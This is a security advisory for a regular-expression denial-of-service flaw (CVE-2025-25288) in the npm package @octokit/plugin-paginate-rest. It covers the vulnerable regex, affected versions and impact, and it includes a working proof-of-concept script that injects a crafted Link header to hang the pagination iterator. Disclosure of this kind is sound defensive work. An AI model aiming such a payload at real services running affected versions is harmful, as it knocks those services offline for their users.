# [M] @octokit/plugin-paginate-rest has a Regular Expression in iterator Leads to ReDoS Vulnerability Due to Catastrophic Backtracking

## Summary
Severity: Medium
Advisory: GHSA-h5c3-5r3r-rr8q
CVE: CVE-2025-25288
CWE: CWE-1333
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2025-02-14
Source: https://github.com/advisories/GHSA-h5c3-5r3r-rr8q
Type: github-advisory

## Affected
- npm: `@octokit/plugin-paginate-rest` — affected >=9.3.0-beta.1 <11.4.1
- npm: `@octokit/plugin-paginate-rest` — affected >=1.0.0 <9.2.2

## Details
### Summary
For the npm package `@octokit/plugin-paginate-rest`, when calling `octokit.paginate.iterator()`, a specially crafted `octokit` instance—particularly with a malicious `link` parameter in the `headers` section of the `request`—can trigger a ReDoS attack.

### Details
The issue occurs at [line 39](https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts) of iterator.ts in the @octokit/plugin-paginate-rest repository. The relevant code is as follows:
```js
url = ((normalizedResponse.headers.link || "").match(
  /<([^>]+)>;\s*rel="next"/,
) || [])[1];
```
The regular expression `/<([^>]+)>;\s*rel="next"/` may lead to a potential backtracking vulnerability, resulting in a ReDoS (Regular Expression Denial of Service) attack. This could cause high CPU utilization and even service slowdowns or freezes when processing specially crafted `Link` headers.

### PoC
[The gist of PoC.js](https://gist.github.com/ShiyuBanzhou/d3f2ad000be8384d2105c87c2ed7ce7d)
1. run npm i @octokit/plugin-paginate-rest
2. run 'node poc.js'
result:
3. then the program will stuck forever with high CPU usage
```js
import { Octokit } from "@octokit/core";
import { paginateRest } from "@octokit/plugin-paginate-rest";

const MyOctokit = Octokit.plugin(paginateRest);
const octokit = new MyOctokit({
  auth: "your-github-token",
});

// Intercept the request to inject a malicious 'link' header for ReDoS
octokit.hook.wrap("request", async (request, options) => {
  const maliciousLinkHeader = "" + "<".repeat(100000) + ">"; // attack string
  return {
    data: [],
    headers: {
      link: maliciousLinkHeader, // Inject malicious 'link' header
    },
  };
});

// Trigger the ReDoS attack by paginating through GitHub issues
(async () => {
  try {
    for await (const normalizedResponse of octokit.paginate.iterator(
      "GET /repos/{owner}/{repo}/issues", { owner: "DayShift", repo: "ReDos", per_page: 100 }
    )) {
      console.log({ normalizedResponse });
    }
  } catch (error) {
    console.error("Error encountered:", error);
  }
})();
```
![image](https://github.com/user-attachments/assets/619c030e-5473-4a26-9e2a-4b9a26c1563b)

### Impact
#### What kind of vulnerability is it?
This is a *Regular Expression Denial of Service (ReDoS) vulnerability*, which occurs due to excessive backtracking in the regex pattern:
```js
/<([^>]+)>;\s*rel="next"/
```
When processing a specially crafted `Link` header, this regex can cause significant performance degradation, leading to high CPU utilization and potential service unresponsiveness.
#### Who is impacted?
* Users of `@octokit/plugin-paginate-rest` who call `octokit.paginate.iterator()` and process untrusted or manipulated `Link` headers.
* Applications relying on Octokit's pagination mechanism, particularly those handling large volumes of API requests.
* GitHub API consumers who integrate this package into their projects for paginated data retrieval.

## References
- https://github.com/octokit/plugin-paginate-rest.js/security/advisories/GHSA-h5c3-5r3r-rr8q
- https://nvd.nist.gov/vuln/detail/CVE-2025-25288
- https://github.com/octokit/plugin-paginate-rest.js/commit/bb6c4f945d8023902cf387391d2b2209261044ab
- https://github.com/octokit/plugin-paginate-rest.js
- https://github.com/octokit/plugin-paginate-rest.js/blob/main/src/iterator.ts
- https://github.com/octokit/plugin-paginate-rest.js/releases/tag/v9.2.2
